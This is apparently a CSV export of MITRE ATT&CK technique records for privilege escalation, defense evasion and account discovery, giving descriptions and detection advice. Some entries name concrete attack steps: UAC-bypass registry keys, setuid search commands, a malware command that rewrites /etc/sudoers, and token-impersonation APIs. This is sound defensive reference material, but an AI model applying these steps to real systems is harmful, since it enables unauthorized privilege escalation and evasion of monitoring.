ID,STIX ID,name,description,url,created,last modified,domain,version,tactics,detection,platforms,data sources,is_sub_technique,parent_technique,defenses bypassed,contributors,permissions required,supports remote,system requirements,impact type,effective permissions,relationship citations
T1548.002,attack-pattern--120d5519-3098-4e1c-9191-2aa61232f073,Abuse Elevation Control Mechanism: Bypass User Account Control,"Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.(Citation: TechNet How UAC Works)

If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box.(Citation: TechNet Inside UAC)(Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)

Many methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:

* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)

Another bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)",https://attack.mitre.org/techniques/T1548/002,30 January 2020,21 April 2023,enterprise-attack,2.1,"Defense Evasion, Privilege Escalation","There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Monitor process API calls for behavior that may be indicative of [Process Injection](https://attack.mitre.org/techniques/T1055) and unusual loaded DLLs through [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), which indicate attempts to gain access to higher privileged processes.

Some UAC bypass methods rely on modifying specific, user-accessible Registry settings. For example:

* The <code>eventvwr.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\Software\Classes\mscfile\shell\open\command</code> Registry key.(Citation: enigma0x3 Fileless UAC Bypass)

* The <code>sdclt.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe</code> and <code>[HKEY_CURRENT_USER]\Software\Classes\exefile\shell\runas\command\isolatedCommand</code> Registry keys.(Citation: enigma0x3 sdclt app paths)(Citation: enigma0x3 sdclt bypass)

Analysts should monitor these Registry settings for unauthorized changes.",Windows,"Command: Command Execution, Process: Process Creation, Process: Process Metadata, Windows Registry: Windows Registry Key Modification",True,T1548,Windows User Account Control,Casey Smith; Stefan Kanthak,"Administrator, User",,,,Administrator,"(Citation: Mandiant No Easy Breach),(Citation: Trend Micro DRBControl February 2020),(Citation: CISA AppleJeus Feb 2021),(Citation: FinFisher Citation),(Citation: MalwareBytes LazyScripter Feb 2021),(Citation: Forcepoint Monsoon),(Citation: Antiy CERT Ramsay April 2020),(Citation: Secure List Bad Rabbit),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Uptycs Warzone UAC Bypass November 2020),(Citation: GitHub PoshC2),(Citation: Proofpoint ZeroT Feb 2017),(Citation: Crowdstrike Indrik November 2018),(Citation: Microsoft FinFisher March 2018),(Citation: Trend Micro Tick November 2019),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Malwarebytes Konni Aug 2021),(Citation: Group IB Cobalt Aug 2017),(Citation: Cybereason Kimsuky November 2020),(Citation: ESET EvilNum July 2020),(Citation: NCC Group WastedLocker June 2020),(Citation: Talent-Jump Clambling February 2020),(Citation: ClearSky MuddyWater Nov 2018),(Citation: ESET Gelsemium June 2021),(Citation: ESET InvisiMole June 2018),(Citation: Palo Alto Shamoon Nov 2016),(Citation: Novetta Winnti April 2015),(Citation: F-Secure BlackEnergy 2014),(Citation: Cymmetria Patchwork),(Citation: Arxiv Avaddon Feb 2021),(Citation: Rancor Unit42 June 2018),(Citation: ESET Grandoreiro April 2020),(Citation: Microsoft BlackCat Jun 2022),(Citation: Talos Lokibot Jan 2021),(Citation: TrendMicro EarthLusca 2022),(Citation: Medium KONNI Jan 2020),(Citation: Check Point Warzone Feb 2020),(Citation: McAfee Honeybee),(Citation: Eset Ramsay May 2020),(Citation: Github Koadic),(Citation: Securelist ScarCruft May 2019),(Citation: FOX-IT May 2016 Mofang),(Citation: Nccgroup Emissary Panda May 2018),(Citation: ESET RTM Feb 2017),(Citation: Github PowerShell Empire),(Citation: ESET Sednit Part 3),(Citation: CISA AR18-352A Quasar RAT December 2018),(Citation: ESET PipeMon May 2020),(Citation: ESET InvisiMole June 2020),(Citation: Github UACMe),(Citation: Fortinet Remcos Feb 2017),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: BitDefender BADHATCH Mar 2021),(Citation: cobaltstrike manual),(Citation: GitHub Pupy),(Citation: Cisco H1N1 Part 2),(Citation: Dell Sakula),(Citation: Cybereason Bumblebee August 2022),(Citation: Github UACMe)"
T1548.004,attack-pattern--b84903f0-c7d5-435d-a69e-de47cc3578c0,Abuse Elevation Control Mechanism: Elevated Execution with Prompt,"Adversaries may leverage the <code>AuthorizationExecuteWithPrivileges</code> API to escalate privileges by prompting the user for credentials.(Citation: AppleDocs AuthorizationExecuteWithPrivileges) The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified. 

Although this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.

Adversaries may abuse <code>AuthorizationExecuteWithPrivileges</code> to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019)(Citation: OSX Coldroot RAT) This technique may be combined with [Masquerading](https://attack.mitre.org/techniques/T1036) to trick the user into granting escalated privileges to malicious code.(Citation: Death by 1000 installers; it's all broken!)(Citation: Carbon Black Shlayer Feb 2019) This technique has also been shown to work by modifying legitimate programs present on the machine that make use of this API.(Citation: Death by 1000 installers; it's all broken!)",https://attack.mitre.org/techniques/T1548/004,30 January 2020,19 October 2022,enterprise-attack,1.0,"Defense Evasion, Privilege Escalation",Consider monitoring for <code>/usr/libexec/security_authtrampoline</code> executions which may indicate that <code>AuthorizationExecuteWithPrivileges</code> is being executed. MacOS system logs may also indicate when <code>AuthorizationExecuteWithPrivileges</code> is being called. Monitoring OS API callbacks for the execution can also be a way to detect this behavior but requires specialized security tooling.,macOS,"Process: OS API Execution, Process: Process Creation",True,T1548,,"Erika Noerenberg, @gutterchurl, Carbon Black; Jimmy Astle, @AstleJimmy, Carbon Black","Administrator, User",,,,root,"(Citation: Carbon Black Shlayer Feb 2019),"
T1548.001,attack-pattern--6831414d-bb70-42b7-8030-d4e06b2660c9,Abuse Elevation Control Mechanism: Setuid and Setgid,"An adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different (and possibly more privileged) user’s context. On Linux or macOS, when the setuid or setgid bits are set for an application binary, the application will run with the privileges of the owning user or group respectively.(Citation: setuid man page) Normally an application is run in the current user’s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them may not have the specific required privileges.

Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications (i.e. [Linux and Mac File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222/002)). The <code>chmod</code> command can set these bits with bitmasking, <code>chmod 4777 [file]</code> or via shorthand naming, <code>chmod u+s [file]</code>. This will enable the setuid bit. To enable the setgid bit, <code>chmod 2775</code> and <code>chmod g+s</code> can be used.

Adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future.(Citation: OSX Keydnap malware) This abuse is often part of a ""shell escape"" or other actions to bypass an execution environment with restricted permissions.

Alternatively, adversaries may choose to find and target vulnerable binaries with the setuid or setgid bits already enabled (i.e. [File and Directory Discovery](https://attack.mitre.org/techniques/T1083)). The setuid and setguid bits are indicated with an ""s"" instead of an ""x"" when viewing a file's attributes via <code>ls -l</code>. The <code>find</code> command can also be used to search for such files. For example, <code>find / -perm +4000 2>/dev/null</code> can be used to find files with setuid set and <code>find / -perm +2000 2>/dev/null</code> may be used for setgid. Binaries that have these bits set may then be abused by adversaries.(Citation: GTFOBins Suid)",https://attack.mitre.org/techniques/T1548/001,30 January 2020,15 March 2023,enterprise-attack,1.1,"Defense Evasion, Privilege Escalation","Monitor the file system for files that have the setuid or setgid bits set. Monitor for execution of utilities, like chmod, and their command-line arguments to look for setuid or setguid bits being set.","Linux, macOS","Command: Command Execution, File: File Metadata, File: File Modification",True,T1548,,,User,,,,,"(Citation: OSX Keydnap malware),(Citation: ANSSI Sandworm January 2021),"
T1548.003,attack-pattern--1365fe3b-0f50-455d-b4da-266ce31c23b0,Abuse Elevation Control Mechanism: Sudo and Sudo Caching,"Adversaries may perform sudo caching and/or use the sudoers file to elevate privileges. Adversaries may do this to execute commands as other users or spawn processes with higher privileges.

Within Linux and MacOS systems, sudo (sometimes referred to as ""superuser do"") allows users to perform commands from terminals with elevated privileges and to control who can perform these commands on the system. The <code>sudo</code> command ""allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.""(Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout</code>, which is the amount of time in minutes between instances of <code>sudo</code> before it will re-prompt for a password. This is because <code>sudo</code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).

The sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the principle of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD: ALL</code>.(Citation: OSX.Dok Malware) Elevated privileges are required to edit this file though.

Adversaries can also abuse poor configurations of these mechanisms to escalate privileges without needing the user's password. For example, <code>/var/db/sudo</code>'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute sudo commands without needing to supply the user's password. Additional, if <code>tty_tickets</code> is disabled, adversaries can do this from any tty for that user.

In the wild, malware has disabled <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo \'Defaults !tty_tickets\' >> /etc/sudoers</code>.(Citation: cybereason osx proton) In order for this change to be reflected, the malware also issued <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has <code>tty_tickets</code> enabled by default.",https://attack.mitre.org/techniques/T1548/003,30 January 2020,14 March 2022,enterprise-attack,1.0,"Defense Evasion, Privilege Escalation","On Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo). This technique is abusing normal functionality in macOS and Linux systems, but sudo has the ability to log all input and output based on the <code>LOG_INPUT</code> and <code>LOG_OUTPUT</code> directives in the <code>/etc/sudoers</code> file.","Linux, macOS","Command: Command Execution, File: File Modification, Process: Process Creation, Process: Process Metadata",True,T1548,,,User,,,,root,"(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: hexed osx.dok analysis 2019),(Citation: objsee mac malware 2017),"
T1548.005,attack-pattern--6fa224c7-5091-4595-bf15-3fc9fe2f2c7c,Abuse Elevation Control Mechanism: Temporary Elevated Cloud Access,"Adversaries may abuse permission configurations that allow them to gain temporarily elevated access to cloud resources. Many cloud environments allow administrators to grant user or service accounts permission to request just-in-time access to roles, impersonate other accounts, pass roles onto resources and services, or otherwise gain short-term access to a set of privileges that may be distinct from their own. 

Just-in-time access is a mechanism for granting additional roles to cloud accounts in a granular, temporary manner. This allows accounts to operate with only the permissions they need on a daily basis, and to request additional permissions as necessary. Sometimes just-in-time access requests are configured to require manual approval, while other times the desired permissions are automatically granted.(Citation: Google Cloud Just in Time Access 2023)(Citation: Azure Just in Time Access 2023)

Account impersonation allows user or service accounts to temporarily act with the permissions of another account. For example, in GCP users with the `iam.serviceAccountTokenCreator` role can create temporary access tokens or sign arbitrary payloads with the permissions of a service account.(Citation: Google Cloud Service Account Authentication Roles) In Exchange Online, the `ApplicationImpersonation` role allows a service account to use the permissions associated with specified user accounts.(Citation: Microsoft Impersonation and EWS in Exchange) 

Many cloud environments also include mechanisms for users to pass roles to resources that allow them to perform tasks and authenticate to other services. While the user that creates the resource does not directly assume the role they pass to it, they may still be able to take advantage of the role's access -- for example, by configuring the resource to perform certain actions with the permissions it has been granted. In AWS, users with the `PassRole` permission can allow a service they create to assume a given role, while in GCP, users with the `iam.serviceAccountUser` role can attach a service account to a resource.(Citation: AWS PassRole)(Citation: Google Cloud Service Account Authentication Roles)

While users require specific role assignments in order to use any of these features, cloud administrators may misconfigure permissions. This could result in escalation paths that allow adversaries to gain access to resources beyond what was originally intended.(Citation: Rhino Google Cloud Privilege Escalation)(Citation: Rhino Security Labs AWS Privilege Escalation)

**Note:** this technique is distinct from [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003), which involves assigning permanent roles to accounts rather than abusing existing permissions structures to gain temporarily elevated access to resources. However, adversaries that compromise a sufficiently privileged account may grant another account they control [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) that would allow them to also abuse these features. This may also allow for greater stealth than would be had by directly using the highly privileged account, especially when logs do not clarify when role impersonation is taking place.(Citation: CrowdStrike StellarParticle January 2022)",https://attack.mitre.org/techniques/T1548/005,10 July 2023,03 October 2023,enterprise-attack,1.0,"Defense Evasion, Privilege Escalation",,"Azure AD, IaaS, Office 365",User Account: User Account Modification,True,T1548,,"Arad Inbar, Fidelis Security",,,,,,","
T1134.002,attack-pattern--677569f9-a8b0-459e-ab24-7f18091fa7bf,Access Token Manipulation: Create Process with Token,"Adversaries may create a new process with an existing token to escalate privileges and bypass access controls. Processes can be created with the token and resulting security context of another user using features such as <code>CreateProcessWithTokenW</code> and <code>runas</code>.(Citation: Microsoft RunAs)

Creating processes with a token not associated with the current user may require the credentials of the target user, specific privileges to impersonate that user, or access to the token to be used. For example, the token could be duplicated via [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) or created via [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) before being used to create a process.

While this technique is distinct from [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001), the techniques can be used in conjunction where a token is duplicated and then used to create a new process.",https://attack.mitre.org/techniques/T1134/002,18 February 2020,11 April 2023,enterprise-attack,1.2,"Defense Evasion, Privilege Escalation","If an adversary is using a standard command-line shell (i.e. [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003)), analysts may detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command or similar artifacts. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)

If an adversary is using a payload that calls the Windows token APIs directly, analysts may detect token manipulation only through careful analysis of user activity, examination of running processes, and correlation with other endpoint and network behavior.

Analysts can also monitor for use of Windows APIs such as <code>CreateProcessWithTokenW</code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.",Windows,"Command: Command Execution, Process: OS API Execution",True,T1134,"File system access controls, System access controls, Windows User Account Control",Jonny Johnson; Vadim Khrykov,,,,,,"(Citation: CheckPoint Naikon May 2020),(Citation: ESET Turla PowerShell May 2019),(Citation: Malwarebytes Konni Aug 2021),(Citation: ESET PipeMon May 2020),(Citation: McAfee Bankshot),(Citation: Medium KONNI Jan 2020),(Citation: Unit42 Azorult Nov 2018),(Citation: Cisco Ukraine Wipers January 2022),(Citation: Talos ZxShell Oct 2014),(Citation: Novetta Blockbuster),(Citation: GitHub PoshC2),(Citation: Github PowerShell Empire),(Citation: Novetta Blockbuster Tools),(Citation: Secureworks REvil September 2019),(Citation: Microsoft runas),(Citation: Microsoft Replace Process Token),(Citation: Microsoft Create Token)"
T1134.003,attack-pattern--8cdeb020-e31e-4f88-a582-f53dcfbda819,Access Token Manipulation: Make and Impersonate Token,"Adversaries may make new tokens and impersonate users to escalate privileges and bypass access controls. For example, if an adversary has a username and password but the user is not logged onto the system the adversary can then create a logon session for the user using the `LogonUser` function. The function will return a copy of the new session's access token and the adversary can use `SetThreadToken` to assign the token to a thread.

This behavior is distinct from [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) in that this refers to creating a new user token instead of stealing or duplicating an existing one.",https://attack.mitre.org/techniques/T1134/003,18 February 2020,11 April 2023,enterprise-attack,1.1,"Defense Evasion, Privilege Escalation","If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)

If an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior.

Analysts can also monitor for use of Windows APIs such as <code>LogonUser</code> and <code> SetThreadToken</code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.",Windows,"Command: Command Execution, Process: OS API Execution",True,T1134,"File system access controls, System access controls, Windows User Account Control",Jonny Johnson,"Administrator, User",,,,SYSTEM,"(Citation: Sygnia Elephant Beetle Jan 2022),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: cobaltstrike manual),(Citation: Microsoft runas),(Citation: Microsoft Replace Process Token),(Citation: Microsoft Create Token)"
T1134.004,attack-pattern--93591901-3172-4e94-abf8-6034ab26f44a,Access Token Manipulation: Parent PID Spoofing,"Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges. New processes are typically spawned directly from their parent, or calling, process unless explicitly specified. One way of explicitly assigning the PPID of a new process is via the <code>CreateProcess</code> API call, which supports a parameter that defines the PPID to use.(Citation: DidierStevens SelectMyParent Nov 2009) This functionality is used by Windows features such as User Account Control (UAC) to correctly set the PPID after a requested elevated process is spawned by SYSTEM (typically via <code>svchost.exe</code> or <code>consent.exe</code>) rather than the current user context.(Citation: Microsoft UAC Nov 2018)

Adversaries may abuse these mechanisms to evade defenses, such as those blocking processes spawning directly from Office documents, and analysis targeting unusual/potentially malicious parent-child process relationships, such as spoofing the PPID of [PowerShell](https://attack.mitre.org/techniques/T1059/001)/[Rundll32](https://attack.mitre.org/techniques/T1218/011) to be <code>explorer.exe</code> rather than an Office document delivered as part of [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001).(Citation: CounterCept PPID Spoofing Dec 2018) This spoofing could be executed via [Visual Basic](https://attack.mitre.org/techniques/T1059/005) within a malicious Office document or any code that can perform [Native API](https://attack.mitre.org/techniques/T1106).(Citation: CTD PPID Spoofing Macro Mar 2019)(Citation: CounterCept PPID Spoofing Dec 2018)

Explicitly assigning the PPID may also enable elevated privileges given appropriate access rights to the parent process. For example, an adversary in a privileged user context (i.e. administrator) may spawn a new process and assign the parent as a process running as SYSTEM (such as <code>lsass.exe</code>), causing the new process to be elevated via the inherited access token.(Citation: XPNSec PPID Nov 2017)",https://attack.mitre.org/techniques/T1134/004,18 February 2020,03 May 2022,enterprise-attack,1.0,"Defense Evasion, Privilege Escalation","Look for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process.(Citation: CounterCept PPID Spoofing Dec 2018)

Monitor and analyze API calls to <code>CreateProcess</code>/<code>CreateProcessA</code>, specifically those from user/potentially malicious processes and with parameters explicitly assigning PPIDs (ex: the Process Creation Flags of 0x8XXX, indicating that the process is being created with extended startup information(Citation: Microsoft Process Creation Flags May 2018)). Malicious use of <code>CreateProcess</code>/<code>CreateProcessA</code> may also be proceeded by a call to <code>UpdateProcThreadAttribute</code>, which may be necessary to update process creation attributes.(Citation: Secuirtyinbits Ataware3 May 2019) This may generate false positives from normal UAC elevation behavior, so compare to a system baseline/understanding of normal system activity if possible.",Windows,"Process: OS API Execution, Process: Process Creation, Process: Process Metadata",True,T1134,"Heuristic Detection, Host Forensic Analysis","Wayne Silva, F-Secure Countercept","Administrator, User",,,,,"(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: ESET PipeMon May 2020),(Citation: Malwarebytes Konni Aug 2021),(Citation: CobaltStrike Daddy May 2017),"
T1134.005,attack-pattern--b7dc639b-24cd-482d-a7f1-8897eda21023,Access Token Manipulation: SID-History Injection,"Adversaries may use SID-History Injection to escalate privileges and bypass access controls. The Windows security identifier (SID) is a unique value that identifies a user or group account. SIDs are used by Windows security in both security descriptors and access tokens. (Citation: Microsoft SID) An account can hold additional SIDs in the SID-History Active Directory attribute (Citation: Microsoft SID-History Attribute), allowing inter-operable account migration between domains (e.g., all values in SID-History are included in access tokens).

With Domain Administrator (or equivalent) rights, harvested or well-known SID values (Citation: Microsoft Well Known SIDs Jun 2017) may be inserted into SID-History to enable impersonation of arbitrary users/groups such as Enterprise Administrators. This manipulation may result in elevated access to local resources and/or access to otherwise inaccessible domains via lateral movement techniques such as [Remote Services](https://attack.mitre.org/techniques/T1021), [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002), or [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).",https://attack.mitre.org/techniques/T1134/005,18 February 2020,09 February 2021,enterprise-attack,1.0,"Defense Evasion, Privilege Escalation","Examine data in user’s SID-History attributes using the PowerShell <code>Get-ADUser</code> cmdlet (Citation: Microsoft Get-ADUser), especially users who have SID-History values from the same domain. (Citation: AdSecurity SID History Sept 2015) Also monitor account management events on Domain Controllers for successful and failed changes to SID-History. (Citation: AdSecurity SID History Sept 2015) (Citation: Microsoft DsAddSidHistory)

Monitor for Windows API calls to the <code>DsAddSidHistory</code> function. (Citation: Microsoft DsAddSidHistory)",Windows,"Active Directory: Active Directory Object Modification, Process: OS API Execution, User Account: User Account Metadata",True,T1134,,"Alain Homewood, Insomnia Security; Vincent Le Toux","Administrator, SYSTEM",,,,,"(Citation: Adsecurity Mimikatz Guide),(Citation: Github PowerShell Empire),(Citation: AdSecurity Kerberos GT Aug 2015),(Citation: Microsoft Trust Considerations Nov 2014),(Citation: AdSecurity Kerberos GT Aug 2015),(Citation: Microsoft SID Filtering Quarantining Jan 2009),(Citation: Microsoft Netdom Trust Sept 2012)"
T1134.001,attack-pattern--86850eff-2729-40c3-b85e-c4af26da4a2d,Access Token Manipulation: Token Impersonation/Theft,"Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls. For example, an adversary can duplicate an existing token using `DuplicateToken` or `DuplicateTokenEx`. The token can then be used with `ImpersonateLoggedOnUser` to allow the calling thread to impersonate a logged on user's security context, or with `SetThreadToken` to assign the impersonated token to a thread.

An adversary may perform [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) when they have a specific, existing process they want to assign the duplicated token to. For example, this may be useful for when the target user has a non-network logon session on the system.

When an adversary would instead use a duplicated token to create a new process rather than attaching to an existing process, they can additionally [Create Process with Token](https://attack.mitre.org/techniques/T1134/002) using `CreateProcessWithTokenW` or `CreateProcessAsUserW`. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001) is also distinct from [Make and Impersonate Token](https://attack.mitre.org/techniques/T1134/003) in that it refers to duplicating an existing token, rather than creating a new one.",https://attack.mitre.org/techniques/T1134/001,18 February 2020,29 September 2023,enterprise-attack,1.2,"Defense Evasion, Privilege Escalation","If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)

Analysts can also monitor for use of Windows APIs such as <code>DuplicateToken(Ex)</code>, <code> ImpersonateLoggedOnUser </code>, and <code> SetThreadToken </code> and correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.",Windows,"Command: Command Execution, Process: OS API Execution",True,T1134,"File system access controls, System access controls, Windows User Account Control",Jonny Johnson,,,,,,"(Citation: FinFisher Citation),(Citation: Tarrask scheduled task),(Citation: FireEye Op RussianDoll),(Citation: Crowdstrike Indrik November 2018),(Citation: Microsoft FinFisher March 2018),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: ESET Okrum July 2019),(Citation: McAfee Shamoon December 2018),(Citation: Binary Defense Emotes Wi-Fi Spreader),(Citation: CheckPoint Naikon May 2020),(Citation: Bitdefender FIN8 July 2021),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: BitDefender BADHATCH Mar 2021),(Citation: cobaltstrike manual),(Citation: Symantec FIN8 Jul 2023),(Citation: GitHub Pupy),(Citation: McAfee Sodinokibi October 2019),(Citation: Unit 42 Siloscape Jun 2021),(Citation: Microsoft runas),(Citation: Microsoft Replace Process Token),(Citation: Microsoft Create Token)"
T1087.004,attack-pattern--8f104855-e5b7-4077-b1f5-bc3103b41abe,Account Discovery: Cloud Account,"Adversaries may attempt to get a listing of cloud accounts. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application.

With authenticated access there are several tools that can be used to find accounts. The <code>Get-MsolRoleMember</code> PowerShell cmdlet can be used to obtain account names given a role or permissions group in Office 365.(Citation: Microsoft msolrolemember)(Citation: GitHub Raindance) The Azure CLI (AZ CLI) also provides an interface to obtain user accounts with authenticated access to a domain. The command <code>az ad user list</code> will list all users within a domain.(Citation: Microsoft AZ CLI)(Citation: Black Hills Red Teaming MS AD Azure, 2018) 

The AWS command <code>aws iam list-users</code> may be used to obtain a list of users in the current account while <code>aws iam list-roles</code> can obtain IAM roles that have a specified path prefix.(Citation: AWS List Roles)(Citation: AWS List Users) In GCP, <code>gcloud iam service-accounts list</code> and <code>gcloud projects get-iam-policy</code> may be used to obtain a listing of service accounts and users in a project.(Citation: Google Cloud - IAM Servie Accounts List API)",https://attack.mitre.org/techniques/T1087/004,21 February 2020,16 March 2021,enterprise-attack,1.2,Discovery,"Monitor processes, command-line arguments, and logs for actions that could be taken to gather information about cloud accounts, including the use of calls to cloud APIs that perform account discovery.

System and network discovery techniques normally occur throughout an operation as an adversary learns the environment, and also to an extent in normal network operations. Therefore discovery data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.","Azure AD, Google Workspace, IaaS, Office 365, SaaS",Command: Command Execution,True,T1087,,Praetorian,User,,,,,"(Citation: Roadtools),(Citation: Crowdstrike TELCO BPO Campaign December 2022),(Citation: AADInternals Documentation),(Citation: GitHub Pacu),(Citation: MSTIC Nobelium Oct 2021),"
T1087.002,attack-pattern--21875073-b0ee-49e3-9077-1e2a885359af,Account Discovery: Domain Account,"Adversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior such as targeting specific accounts which possess particular privileges.

Commands such as <code>net user /domain</code> and <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscacheutil -q group</code>on macOS, and <code>ldapsearch</code> on Linux can list domain users and groups. [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets including <code>Get-ADUser</code> and <code>Get-ADGroupMember</code> may enumerate members of Active Directory groups.  ",https://attack.mitre.org/techniques/T1087/002,21 February 2020,15 April 2023,enterprise-attack,1.2,Discovery,"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.

Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).
